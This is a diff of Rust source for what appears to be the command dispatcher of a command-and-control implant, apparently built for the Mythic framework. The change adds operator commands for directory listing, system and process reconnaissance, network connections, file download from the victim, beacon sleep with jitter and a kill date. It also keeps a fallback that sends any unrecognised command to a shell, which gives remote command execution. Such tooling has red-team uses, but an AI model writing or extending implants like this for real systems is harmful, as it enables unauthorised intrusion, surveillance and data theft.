@@ -46,23 +46,28 @@ pub fn link_loop() {
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
 fn dispatch(command: &str, parameters: &str) -> String {
-    let raw = if parameters.is_empty() {
-        command.to_string()
-    } else {
-        format!("{} {}", command, parameters)
-    };
-
-    if let Some(output) = dispatch_common(&raw) {
-        return output;
-    }
-
     match command {
+        "ls" => link_common::list_dir(&link_common::extract_param(parameters, "path")),
+        "cd" => std::env::set_current_dir(link_common::extract_param(parameters, "path"))
+            .map(|_| String::new())
+            .unwrap_or_else(|e| format!("[-] {}", e)),
+        "pwd" => std::env::current_dir()
+            .map(|p| p.display().to_string())
+            .unwrap_or_else(|e| format!("[-] {}", e)),
         "whoami" => format!("{}@{}", username(), hostname()),
         "info" => collect_system_info(),
         "ps" => list_processes(),
         "netstat" => list_network_connections(),
+        "download" => link_common::download_file(&link_common::extract_param(parameters, "path")),
+        "upload" => "[-] upload via Mythic file store: implement in Phase 5".to_string(),
+        "sleep" => {
+            let secs = link_common::extract_param(parameters, "seconds");
+            let jitter = link_common::extract_param(parameters, "jitter");
+            link_common::handle_sleep_command(&format!("{} {}", secs, jitter).trim().to_string())
+        },
+        "killdate" => link_common::handle_killdate_command(&link_common::extract_param(parameters, "date")),
         "shell" => shell_exec(parameters),
-        _ => shell_exec(&raw),
+        _ => shell_exec(&format!("{} {}", command, parameters)),
     }
 }
 
